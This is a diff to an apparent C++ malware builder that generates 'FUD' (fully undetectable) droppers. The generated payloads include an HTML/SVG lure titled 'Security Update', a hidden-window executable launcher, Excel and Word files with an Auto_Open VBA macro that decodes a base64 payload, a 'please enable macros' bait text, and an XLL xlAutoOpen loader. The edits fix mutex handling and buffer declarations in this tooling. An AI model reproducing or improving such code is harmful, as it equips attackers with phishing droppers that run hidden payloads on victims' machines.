@@ -745,7 +745,7 @@ public:
         return R"(
 // HTML & SVG Exploit Generator
 void executeHTMLSVGExploit() {
-    char htmlExploit[] = 
+    static const char htmlExploit[] = 
         "<!DOCTYPE html>\n"
         "<html>\n"
         "<head><title>Security Update</title></head>\n"
@@ -786,10 +786,12 @@ void executeHTMLSVGExploit() {
         fclose(htmlFile);\n
         // Only launch if not already running
         HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\FUD_HTML_Once");
-        if (GetLastError() != ERROR_ALREADY_EXISTS) {
-            ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
-        }
-        if (hMutex) CloseHandle(hMutex);\n
+        if (hMutex != NULL) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
+                ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_SHOW);
+            }
+            CloseHandle(hMutex);
+        }\n
     }\n
 }
 )";
@@ -828,10 +830,12 @@ void executeWinRExploit() {
         
         // Execute only if not already running
         HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\FUD_Exec_Once");
-        if (GetLastError() != ERROR_ALREADY_EXISTS) {
-            ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_HIDE);
+        if (hMutex != NULL) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS) {
+                ShellExecuteA(NULL, "open", tempPath, NULL, NULL, SW_HIDE);
+            }
+            CloseHandle(hMutex);
         }
-        if (hMutex) CloseHandle(hMutex);
     }
 }
 )";
@@ -914,7 +918,7 @@ void executeDocXlsExploit() {
         fwrite(xlsHeader, 1, sizeof(xlsHeader), xlsFile);
         
         // Malicious VBA macro content (simplified)
-        char macroContent[] = 
+        static const char macroContent[] = 
             "Sub Auto_Open()\n"
             "    Dim payload As String\n"
             "    payload = \")" + base64Payload + R"(\"\n"
@@ -952,7 +956,7 @@ void executeDocXlsExploit() {
             };
             fwrite(docxHeader, 1, sizeof(docxHeader), docxFile);
             
-            char docContent[] = 
+            static const char docContent[] = 
                 "This document contains important security information.\n"
                 "Please enable macros to view the full content.\n"
                 "Document generated on: " __DATE__ "\n";
@@ -986,7 +990,7 @@ void executeXllExploit() {
         fwrite(xllHeader, 1, sizeof(xllHeader), xllFile);
         
         // Embedded payload and loader code
-        char xllCode[] = 
+        static const char xllCode[] = 
             "// XLL Auto-execution function\n"
             "__declspec(dllexport) int xlAutoOpen() {\n"
             "    // This function is called when Excel loads the XLL\n"
@@ -2023,7 +2027,7 @@ public:
         source << "// Timestamp: " << timestampEngine.generateRealisticTimestamp() << "\n\n";
         
         // Embed PE data as byte array (size limited to prevent source generation issues)
-        size_t maxEmbedSize = 8192; // 8KB limit for testing
+        size_t maxEmbedSize = 512; // 512 bytes limit to prevent truncation
         size_t embedSize = (peData.size() < maxEmbedSize) ? peData.size() : maxEmbedSize;
         
         source << "unsigned char " << varName << "[] = {\n";
